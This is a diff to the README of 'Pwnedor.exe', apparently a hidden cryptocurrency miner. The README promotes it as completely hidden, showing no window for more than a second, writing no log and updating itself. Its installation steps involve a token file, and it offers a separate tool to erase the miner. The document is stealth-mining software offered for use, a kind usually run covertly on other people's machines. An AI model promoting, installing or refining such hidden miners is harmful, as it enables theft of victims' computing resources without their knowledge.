@@ -26,17 +26,20 @@ No windows will be display more than 1sec, no verbose, no log,
 [+] Auto-Update;  
 *dev donate 10%  
 
+# Download  
+Dowload from Github Pwnedor.exe.
+If you need to delet all compoment of the Pwnedor, Download "killPwnedor.exe" which if launched will erase the hidden miner Pwnedor  
+if necessary for extract 7z files use 7Zip can be downloaded at : https://www.7-zip.org/download.html  
+
 # INSTALLATION  
-double clic on Pwnedor.exe and its done  
+double clic on Pwnedor.exe and its done, you will maybe see a windows for less than 1sec its normal, this software is completly hidden !    
 Very very important :  
 you MUST first launch the miner with a file named token.txt in the same directory !  
 in this file you must provide you'r utopia token in the first line without "--token"  
 Exemple of content of token.txt file :  
 45675BC9A6E34147862140CA8B30E130  
 
-# Download  
-Dowload from Github and extract Pwnedor.7z you will find Pwnedor.exe which is the software.
-If you need to delet all compoment of the Pwnedor, Download "killPwnedor.7z", extract and launch "killPwnedor.exe"
+
 
 # informations  
 A responsibility: The Developer shall not be liable for any damage, direct or indirect damages (including losses from loss of profit, 
